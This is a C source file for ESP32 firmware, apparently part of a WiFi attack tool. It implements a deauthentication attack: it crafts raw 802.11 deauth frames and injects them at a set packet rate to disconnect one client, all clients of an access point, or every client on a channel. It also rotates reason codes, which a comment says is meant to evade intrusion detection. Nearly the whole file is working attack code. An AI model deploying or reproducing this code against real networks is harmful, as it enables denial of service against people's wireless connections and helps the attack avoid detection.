#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_engine.h"
#include <stdlib.h>
#include <string.h>

static const char *TAG = "DEAUTH";

/* 802.11 Deauthentication frame template */
static const uint8_t DEAUTH_FRAME_TEMPLATE[] = {
    /* Frame Control: Deauthentication (0xC0), no more frags, no retry */
    0xC0,
    0x00,
    /* Duration */
    0x00,
    0x00,
    /* Destination (client MAC — filled at runtime) */
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    /* Source (AP BSSID — filled at runtime) */
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    /* BSSID (AP BSSID — filled at runtime) */
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    /* Sequence control */
    0x00,
    0x00,
    /* Reason code: 7 = Class 3 frame received from nonassociated station */
    0x07,
    0x00,
};

/* Reason codes to rotate through (evade simple IDS) */
static const uint16_t DEAUTH_REASONS[] = {
    1, /* Unspecified */
    2, /* Previous auth no longer valid */
    3, /* Deauthenticated: station leaving */
    6, /* Class 2 frame received from nonauthenticated station */
    7, /* Class 3 frame received from nonassociated station */
    8, /* Disassociated: station leaving */
};
#define DEAUTH_REASON_COUNT (sizeof(DEAUTH_REASONS) / sizeof(DEAUTH_REASONS[0]))

typedef struct {
  uint8_t bssid[6];
  uint8_t client[6];
  uint8_t channel;
  uint32_t pps;
  uint32_t duration_ms;
  bool running;
} deauth_task_args_t;

static deauth_task_args_t s_args = {0};
static TaskHandle_t s_deauth_task = NULL;
static uint32_t s_reason_idx = 0;

/* ── Raw frame inject ──────────────────────────── */
static void send_deauth(const uint8_t *dst, const uint8_t *bssid,
                        uint16_t reason) {
  uint8_t frame[sizeof(DEAUTH_FRAME_TEMPLATE)];
  memcpy(frame, DEAUTH_FRAME_TEMPLATE, sizeof(frame));

  /* Fill destination */
  memcpy(&frame[4], dst, 6);
  /* Fill source (AP) */
  memcpy(&frame[10], bssid, 6);
  /* Fill BSSID */
  memcpy(&frame[16], bssid, 6);
  /* Reason code */
  frame[24] = reason & 0xFF;
  frame[25] = (reason >> 8) & 0xFF;

  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);

  /* Also send from client → AP direction */
  memcpy(&frame[4], bssid, 6);
  memcpy(&frame[10], dst, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
}

/* ── Deauth task ───────────────────────────────── */
static void deauth_task(void *arg) {
  deauth_task_args_t *a = (deauth_task_args_t *)arg;
  uint32_t delay_ms = (a->pps > 0) ? (1000 / a->pps) : 10;
  uint32_t elapsed = 0;

  esp_wifi_set_channel(a->channel, WIFI_SECOND_CHAN_NONE);
  ESP_LOGI(TAG, "Deauth started → channel %d, %lu pps", a->channel, a->pps);

  while (a->running && (a->duration_ms == 0 || elapsed < a->duration_ms)) {
    uint16_t reason = DEAUTH_REASONS[s_reason_idx++ % DEAUTH_REASON_COUNT];
    send_deauth(a->client, a->bssid, reason);
    vTaskDelay(pdMS_TO_TICKS(delay_ms));
    elapsed += delay_ms;
  }

  ESP_LOGI(TAG, "Deauth task complete");
  s_deauth_task = NULL;
  vTaskDelete(NULL);
}

/* ── Public API ────────────────────────────────── */

esp_err_t wifi_deauth_start(const uint8_t *bssid, const uint8_t *client_mac,
                            uint8_t channel, uint32_t pps,
                            uint32_t duration_ms) {
  if (s_deauth_task)
    wifi_deauth_stop();

  memcpy(s_args.bssid, bssid, 6);

  if (client_mac) {
    memcpy(s_args.client, client_mac, 6);
  } else {
    /* Broadcast — hit all clients */
    memset(s_args.client, 0xFF, 6);
  }

  s_args.channel = channel;
  s_args.pps = (pps > 0) ? pps : 50;
  s_args.duration_ms = duration_ms;
  s_args.running = true;

  xTaskCreatePinnedToCore(deauth_task, "deauth", 4096, &s_args, 5,
                          &s_deauth_task, 0);
  return ESP_OK;
}

esp_err_t wifi_deauth_all(uint32_t pps, uint32_t duration_ms) {
  /* TODO: iterate scan results and deauth each AP */
  /* For now, broadcast on current channel */
  uint8_t broadcast_bssid[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  return wifi_deauth_start(broadcast_bssid, NULL, 1, pps, duration_ms);
}

esp_err_t wifi_deauth_stop(void) {
  s_args.running = false;
  if (s_deauth_task) {
    vTaskDelay(pdMS_TO_TICKS(100));
    if (s_deauth_task) {
      vTaskDelete(s_deauth_task);
      s_deauth_task = NULL;
    }
  }
  ESP_LOGI(TAG, "Deauth stopped");
  return ESP_OK;
}
